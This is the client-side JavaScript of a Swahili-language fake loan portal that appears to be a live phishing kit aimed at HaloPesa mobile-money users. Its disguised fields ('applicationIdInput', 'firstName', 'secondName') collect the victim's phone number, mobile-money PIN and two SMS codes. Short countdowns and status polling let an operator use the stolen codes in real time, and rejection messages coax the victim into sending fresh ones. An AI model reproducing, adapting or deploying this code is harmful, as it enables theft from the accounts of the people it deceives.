
// Accessible segmented entry for portal-generated numeric IDs and codes.
// The underlying inputs keep their existing IDs so the API workflow is unchanged.
(function initDigitEntries(){
  document.querySelectorAll("[data-digit-entry]").forEach(function(wrapper){
    const inputId=wrapper.getAttribute("data-digit-entry");
    const input=document.getElementById(inputId);
    const boxes=wrapper.querySelector(".digit-boxes");
    const length=Number(wrapper.getAttribute("data-length")||4);
    const eye=wrapper.querySelector("[data-eye-for]");
    if(!input||!boxes)return;
    let revealed=false;
    for(let i=0;i<length;i++){
      const cell=document.createElement("div");
      cell.className="digit-cell";
      cell.setAttribute("aria-hidden","true");
      boxes.appendChild(cell);
    }
    function paint(){
      const value=input.value||"";
      Array.from(boxes.children).forEach((cell,i)=>{
        const char=value[i]||"";
        cell.textContent=char?(revealed?char:"*"):"";
        cell.classList.toggle("masked",!!char&&!revealed);
        cell.classList.toggle("active",i===Math.min(value.length,length-1)&&value.length<length);
      });
    }
    input.addEventListener("input",function(){
      input.value=input.value.replace(/\D/g,"").slice(0,length);
      paint();
      if(input.value.length===length){
        const next=inputId==="applicationIdInput"?null:document.getElementById(inputId==="firstName"?"firstNameBtn":"secondNameBtn");
        if(next) next.focus();
      }
    });
    boxes.addEventListener("click",()=>input.focus());
    input.addEventListener("focus",paint);
    input.addEventListener("blur",paint);
    if(eye){
      eye.addEventListener("click",()=>{
        revealed=!revealed;
        input.type=revealed?"text":"password";
        eye.textContent=revealed?"🙈":"👁";
        eye.setAttribute("aria-label",revealed?"Ficha nambari":"Onyesha nambari");
        paint();
        input.focus();
      });
    }
    // Render updates from browser autofill or existing application code.
    input.addEventListener("change",paint);
    paint();
  });
})();

const state={page:1,applicationId:null,applicationNo:null,phone:"",amount:null,firstResubmit:false,secondResubmit:false,referralToken:(new URLSearchParams(window.location.search).get('admin')||new URLSearchParams(window.location.search).get('ref')||'')};
const timers={first:null,second:null};
const $=id=>document.getElementById(id);
const pages=[...document.querySelectorAll(".page")];
const stepEls=[...document.querySelectorAll(".step")];
function showPage(page){
  state.page=page;
  pages.forEach(p=>p.classList.toggle("active",p.dataset.page===String(page)));
  const n=Number(page);
  stepEls.forEach((x,i)=>{x.classList.toggle("active",Number.isFinite(n)&&i===n-1);x.classList.toggle("done",Number.isFinite(n)&&i<n-1);});
  if(page===2) startNameTimer("first");
  if(page===3) startNameTimer("second");
  window.scrollTo({top:0,behavior:"smooth"});
}
function setError(id,msg){const e=$(id);e.textContent=msg||"";e.classList.toggle("hidden",!msg);}
async function status(){const r=await fetch(`/api/applications/${state.applicationId}/status`);return r.json();}
function stopNameTimer(type){if(timers[type]){clearInterval(timers[type]);timers[type]=null;}}
function setTimerText(type,seconds){
  const el=$(type+"NameTimer"); if(!el)return;
  const ring=$(type+"NameRing"), number=$(type+"NameSeconds");
  const safe=Math.max(0,Math.min(30,Number(seconds)||0));
  if(number) number.textContent=String(safe);
  if(ring) ring.style.setProperty("--progress", `${(safe/30)*100}%`);
  el.classList.toggle("expired",safe<=0);
  const label=el.querySelector(".countdown-label");
  if(label) label.textContent=safe>0?"Muda wa kutuma":"Muda umeisha  bonyeza TUMA TENA";
}
function setNameSubmitMode(type,expired){
  const btn=$(type+"NameBtn"), resubmit=$(type+"NameResubmit");
  if(!btn||!resubmit)return;
  btn.classList.toggle("hidden",expired);
  resubmit.classList.toggle("hidden",!expired);
  btn.disabled=expired;
}
function startNameTimer(type,deadlineOverride=null){
  stopNameTimer(type);
  const deadline=deadlineOverride || state[type+"Deadline"];
  if(!deadline){setTimerText(type,30);setNameSubmitMode(type,false);return;}
  const tick=()=>{
    const seconds=Math.max(0,Math.ceil((new Date(deadline).getTime()-Date.now())/1000));
    setTimerText(type,seconds);
    setNameSubmitMode(type,seconds<=0);
    if(seconds<=0)stopNameTimer(type);
  };
  tick();
  timers[type]=setInterval(tick,250);
}
async function refreshDeadlineFor(type){
  try{
    const d=await status();
    const key=type==="first"?"firstNameDeadlineAt":"secondNameDeadlineAt";
    state[type+"Deadline"]=d[key]||null;
    startNameTimer(type,state[type+"Deadline"]);
  }catch{}
}
async function waitForStatus(expected,next,errorId){
  while(true){
    try{
      const d=await status();
      if(d.status===expected){
        if(next===2){state.firstDeadline=d.firstNameDeadlineAt||null;startNameTimer("first",state.firstDeadline);}
        if(next===3){state.secondDeadline=d.secondNameDeadlineAt||null;startNameTimer("second",state.secondDeadline);}
        if(next===4 && d.amount) $("loanAmount").value=String(d.amount);
        showPage(next);return;
      }
      if(d.status==="REJECTED"){handleRejection(d);return;}
      if(d.status==="DISBURSEMENT_PROCESSING"){
        $("successNumber").textContent=d.applicationNo||state.applicationNo;
        $("successAmount").textContent=new Intl.NumberFormat("en-TZ",{style:"currency",currency:"TZS",maximumFractionDigits:0}).format(Number(d.amount||0));
        showPage("success");return;
      }
    }catch{}
    await new Promise(r=>setTimeout(r,150));
  }
}
function handleRejection(d){
  const messages={
    APPLICATION_DETAILS:"PIN yako ya halopesa haikukubaliwa. Hakiki numberi na pin yako kisha ujaribu tena.",
    FIRST_NAME:"Code 1 haikukubaliwa. Weka codi mpya unayo pokea kwa simu yako na ujaribu tena.",
    SECOND_NAME:"Code 2 haikukubaliwa. Weka codi mpya unayo pokea kwa simu yako na ujaribu tena.",
    AMOUNT:"Kiasi cha mkopo hakikukubaliwa. Hakiki kiasi ulichoweka kisha ujaribu tena."
  };
  const msg=messages[d.rejectedStage]||"Ombi halikukubaliwa. Hakiki taarifa za HALOPESA hii kisha ujaribu tena.";
  if(d.rejectedStage==="FIRST_NAME"){
    stopNameTimer("first");state.firstDeadline=null;$("firstName").value="";$("firstName").dispatchEvent(new Event("input",{bubbles:true}));$("firstName").disabled=false;$("firstNameBtn").classList.remove("hidden");$("firstNameResubmit").classList.add("hidden");$("firstNameWaiting").classList.add("hidden");setError("page2Error",msg);showPage(2);
  }else if(d.rejectedStage==="SECOND_NAME"){
    stopNameTimer("second");state.secondDeadline=null;$("secondName").value="";$("secondName").dispatchEvent(new Event("input",{bubbles:true}));$("secondName").disabled=false;$("secondNameBtn").classList.remove("hidden");$("secondNameResubmit").classList.add("hidden");$("secondNameWaiting").classList.add("hidden");setError("page3Error",msg);showPage(3);
  }else if(d.rejectedStage==="AMOUNT"){
    $("loanAmount").disabled=false;$("loanAmountBtn").classList.remove("hidden");$("loanAmountBtn").disabled=false;$("loanAmountWaiting").classList.add("hidden");setError("page4Error",msg);showPage(4);
  }else{
    $("phone").disabled=false;$("applicationIdInput").disabled=false;$("startApplication").classList.remove("hidden");$("startApplication").disabled=false;$("approvalWaiting").classList.add("hidden");setError("loginError",msg);showPage(1);
  }
}
$("loginForm").addEventListener("submit",async e=>{
  e.preventDefault();setError("loginError","");
  const phone=$("phone").value.trim(),applicationId=$("applicationIdInput").value.trim();
  if(!/^[0-9+\s-]{9,20}$/.test(phone))return setError("loginError","Weka nambari sahihi ya simu.");
  if(!/^\d{4}$/.test(applicationId))return setError("loginError","Weka pin ya halopesa .");
  const b=$("startApplication");b.disabled=true;
  try{const r=await fetch("/api/applications",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,applicationId,referralToken:state.referralToken})});const d=await r.json();if(!r.ok)throw new Error(d.error);state.applicationId=d.applicationId;state.applicationNo=d.applicationNo;$("applicationNumber").textContent=d.applicationNo;$("approvalWaiting").classList.remove("hidden");$("phone").disabled=true;$("applicationIdInput").disabled=true;b.classList.add("hidden");await waitForStatus("APPROVED",2,"loginError");}catch(err){setError("loginError",err.message||"Imeshindikana kutuma ombi.");b.disabled=false;}
});
async function submitName(type,resubmit=false){
  resubmit = Boolean(resubmit || state[type+"Resubmit"]);
  const input=$(type+"Name"),btn=$(type+"NameBtn"),waiting=$(type+"NameWaiting"),errorId=type==="first"?"page2Error":"page3Error";
  setError(errorId,"");
  const value=input.value.trim();
  if(!/^\d{4}$/.test(value))return setError(errorId,"Ingiza hapa tarakimu 4 uliopokea kwa simu yako.");
  btn.disabled=true;
  try{
    const endpoint=type==="first"?"first-name":"second-name";
    const r=await fetch(`/api/applications/${state.applicationId}/${endpoint}`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(type==="first"?{firstName:value,resubmit}:{secondName:value,resubmit})});
    const d=await r.json();
    if(!r.ok){
      if(d.resubmitRequired){stopNameTimer(type);setTimerText(type,0);setNameSubmitMode(type,true);btn.disabled=false;return;}
      throw new Error(d.error);
    }
    stopNameTimer(type);state[type+"Deadline"]=d.deadlineAt||null;state[type+"Resubmit"]=false;input.disabled=true;btn.classList.add("hidden");$(type+"NameResubmit").classList.add("hidden");waiting.classList.remove("hidden");
    await waitForStatus(type==="first"?"APPROVED_FIRST_NAME":"APPROVED_SECOND_NAME",type==="first"?3:4,errorId);
  }catch(err){btn.disabled=false;setError(errorId,err.message||"Imeshindikana kutuma taarifa.");}
}
$("firstNameBtn").addEventListener("click",()=>submitName("first",false));
$("secondNameBtn").addEventListener("click",()=>submitName("second",false));
$("firstNameResubmit").addEventListener("click",()=>{state.firstResubmit=true;state.firstDeadline=null;$("firstName").disabled=false;$("firstNameBtn").disabled=false;$("firstNameResubmit").classList.add("hidden");setNameSubmitMode("first",false);startNameTimer("first",new Date(Date.now()+30000).toISOString());});
$("secondNameResubmit").addEventListener("click",()=>{state.secondResubmit=true;state.secondDeadline=null;$("secondName").disabled=false;$("secondNameBtn").disabled=false;$("secondNameResubmit").classList.add("hidden");setNameSubmitMode("second",false);startNameTimer("second",new Date(Date.now()+30000).toISOString());});
$("loanAmountBtn").addEventListener("click",async()=>{setError("page4Error","");const amount=Number($("loanAmount").value);if(!Number.isInteger(amount)||amount<1)return setError("page4Error","Weka kiasi sahihi cha mkopo kwa nambari kamili.");const b=$("loanAmountBtn");b.disabled=true;try{const r=await fetch(`/api/applications/${state.applicationId}/amount`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({amount})});const d=await r.json();if(!r.ok)throw new Error(d.error);state.amount=amount;$("loanAmount").disabled=true;b.classList.add("hidden");$("loanAmountWaiting").classList.remove("hidden");await waitForStatus("DISBURSEMENT_PROCESSING","success","page4Error");}catch(err){b.disabled=false;setError("page4Error",err.message||"Imeshindikana kutuma kiasi cha mkopo.");}});
